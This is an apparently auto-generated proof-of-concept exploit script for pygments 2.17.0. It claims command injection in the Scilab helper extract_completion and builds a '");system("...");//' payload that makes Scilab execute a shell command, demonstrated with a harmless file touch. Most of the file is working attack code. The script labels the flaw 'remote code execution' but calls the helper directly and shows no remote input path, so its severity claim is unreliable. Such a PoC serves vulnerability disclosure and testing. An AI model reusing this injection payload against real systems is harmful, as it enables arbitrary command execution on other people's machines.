#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: rce-012
# Sink: extract_completion
# Auto-generated — run with: python3 rce_function_extract_completion_uses_extract_completion.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pygments-2.17.0 RCE vulnerability.
The vulnerability exists in the extract_completion function in
pygments/lexers/_scilab_builtins.py. The function passes user-controlled
var_type directly into a Scilab command string that is executed via
subprocess.Popen. An attacker can inject arbitrary Scilab commands,
including system() calls, to achieve remote code execution.

This PoC demonstrates the vulnerability by executing a benign command
(touch /tmp/poc_success.txt) to prove code execution.
"""

import subprocess
import sys
import os

# Configuration
TARGET_SCRIPT = "/tmp/pygments_test2/pygments-2.17.0/pygments/lexers/_scilab_builtins.py"
BENIGN_PAYLOAD = 'touch /tmp/poc_success.txt'

def exploit():
    """
    Exploit the RCE vulnerability by injecting a Scilab system() command
    through the var_type parameter.
    """
    print("[*] Pygments RCE PoC")
    print(f"[*] Target: {TARGET_SCRIPT}")
    print(f"[*] Benign payload: {BENIGN_PAYLOAD}")
    
    # The vulnerable code does:
    # s = subprocess.Popen(['scilab', '-nwni'], stdin=subprocess.PIPE, ...)
    # output = s.communicate('''... completion("", "%s") ...''' % var_type)
    #
    # We inject a Scilab command that calls system() to execute our payload.
    # The injection breaks out of the completion() call and executes arbitrary
    # Scilab code.
    
    # Craft the malicious var_type that will:
    # 1. Close the completion() string
    # 2. Execute system() with our command
    # 3. Handle the rest of the Scilab script gracefully
    
    # The original template is:
    # fd = mopen("/dev/stderr", "wt");
    # mputl(strcat(completion("", "%s"), "||"), fd);
    # mclose(fd)
    #
    # We inject: ");system('touch /tmp/poc_success.txt');//
    # This results in:
    # completion("", ");system('touch /tmp/poc_success.txt');//")
    # Which becomes:
    # completion("", ");system('touch /tmp/poc_success.txt');//")
    # Scilab interprets this as:
    # completion("", ");  <- closes the string
    # system('touch /tmp/poc_success.txt');  <- executes our command
    # //")  <- comments out the rest
    
    malicious_var_type = f'");system("{BENIGN_PAYLOAD}");//'
    
    print(f"[*] Injected var_type: {malicious_var_type!r}")
    
    # Simulate what the vulnerable code does
    # We need to import the module and call extract_completion with our payload
    # But since we're demonstrating the vulnerability, we'll directly simulate
    # the vulnerable code path
    
    try:
        # Add the pygments path to sys.path
        sys.path.insert(0, "/tmp/pygments_test2/pygments-2.17.0")
        
        # Import the vulnerable module
        from pygments.lexers._scilab_builtins import extract_completion
        
        print("[*] Calling extract_completion with malicious var_type...")
        
        # This will trigger the vulnerability
        result = extract_completion(malicious_var_type)
        
        print(f"[*] Function returned: {result}")
        
        # Check if our payload executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: /tmp/poc_success.txt was created!")
            print("[+] Remote code execution confirmed!")
            # Clean up
            os.remove("/tmp/poc_success.txt")
            print("[*] Cleaned up /tmp/poc_success.txt")
        else:
            print("[-] Payload may not have executed. Check if scilab is installed.")
            print("[*] The vulnerability exists in the code, but scilab may not be available.")
            
    except ImportError as e:
        print(f"[-] Import error: {e}")
        print("[*] Make sure pygments is installed at the specified path")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        print("[*] This may be because scilab is not installed or the DISPLAY is not set")
        print("[*] The vulnerability is still present in the code")
        sys.exit(1)

def demonstrate_vulnerable_code():
    """
    Show the exact vulnerable code path for documentation purposes.
    """
    print("\n[*] Vulnerable code path:")
    print("""
    # In pygments/lexers/_scilab_builtins.py:
    
    s = subprocess.Popen(['scilab', '-nwni'], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = s.communicate('''\\
    fd = mopen("/dev/stderr", "wt");
    mputl(strcat(completion("", "%s"), "||"), fd);
    mclose(fd)\\n''' % var_type)
    
    # var_type is directly interpolated into the Scilab command string
    # An attacker can inject: ");system('command');//
    # This breaks out of the completion() call and executes arbitrary Scilab code
    """)

if __name__ == "__main__":
    demonstrate_vulnerable_code()
    exploit()
